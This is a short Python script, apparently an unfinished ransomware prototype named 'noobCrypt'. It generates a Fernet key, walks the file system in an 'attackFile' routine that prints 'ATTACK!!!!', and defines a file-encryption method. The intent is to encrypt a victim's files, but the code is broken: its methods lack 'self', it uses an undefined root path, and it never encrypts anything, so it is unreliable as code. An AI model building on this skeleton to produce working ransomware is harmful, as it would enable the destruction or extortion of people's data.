import os, base64, Tkinter
from cryptography.fernet import Fernet
import base64

class noobCrypt:
    def __init__(self,fileName, contents, key):
        self.fileName = fileName
        self.contents = contents
        self.key = key
    #End __init__

    def createKey():
        key = Fernet.generate_key()
        print("Key = "+ str(key))
        return key
    #End createKey()

    def attackFile(fileName, key):
        print("ATTACK!!!! @_@")
        system = os.walk(self.localRoot, topdown=True)
        for root, dir, files in system:
            for file in files:
                file_path = os.path.join(root, file)

    #End getPath()

    def getFileName():
        print("getFileName")
        fileName= input("Enter a file name: ")
        fileName += ".txt"
        return fileName
    #End getFileName()

    def encrypt(key, contents):
        f = Fernet(key)
        encryptedContents = f.encrypt(contents)
        print(encryptedContents)
    #End encrypt

    fileName = getFileName()
    key = createKey()
    attackFile(fileName, key)
    

